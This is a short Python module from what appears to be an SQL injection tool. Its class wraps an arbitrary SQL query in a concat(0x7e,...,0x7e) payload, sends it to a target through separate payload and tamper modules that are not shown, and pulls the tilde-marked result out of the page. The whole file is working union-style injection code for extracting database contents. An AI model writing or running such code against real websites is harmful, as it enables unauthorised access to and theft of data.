import re

from sqli.payload import payload
from sqli.tamper.Default import default


class Uni:
    defSql = 'concat(0x7e,({0}),0x7e)'
    pattern = re.compile(r'~[\s\S]+~')

    def __init__(self, http='', tamper=default()):
        self.http = http
        self.tamper = tamper

    def get(self, fuckSql):
        result = ''
        sql = self.defSql.format(fuckSql)
        req = payload(self.http, sql, self.tamper)
        text = req.result.text
        text = self.pattern.findall(text)
        if len(text) != 0:
            text = text[0][1:-1]
        result += text
        print(result.replace(',', ',\n').replace('::', ' :: '))
        return result
